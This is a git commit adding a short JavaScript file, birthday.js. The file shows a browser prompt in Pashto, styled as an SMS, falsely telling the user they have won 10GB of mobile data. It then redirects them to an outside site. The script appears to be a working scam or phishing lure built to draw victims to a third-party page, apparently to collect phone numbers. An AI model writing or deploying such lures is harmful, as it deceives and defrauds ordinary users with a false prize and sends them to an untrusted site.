86a746eb655e79ef4fd3b82fffe15788772f0e2b
newetijazz15 <newetijazz15@gmail.com>
2026-01-21 09:59:13 +0100

    Create birthday.js

---
+++ birthday.js
@@ -0,0 +1,5 @@
+var password = '۱۰ جي بي فعال کړئ'
+password=prompt('SMS: مبارک شه، ستاسو د موبایل شمیره د 10GB ترلاسه کولو وړ ده، د خپل موبایل شمیره دننه کولو لپاره په OK کلیک وکړئ.','۱۰ جي بي فعال کړئ');
+if (password != '۱۰ جي بي فعال کړئ') {
+location.href='https://www.mberytc.site/birthday-10gb';
+}
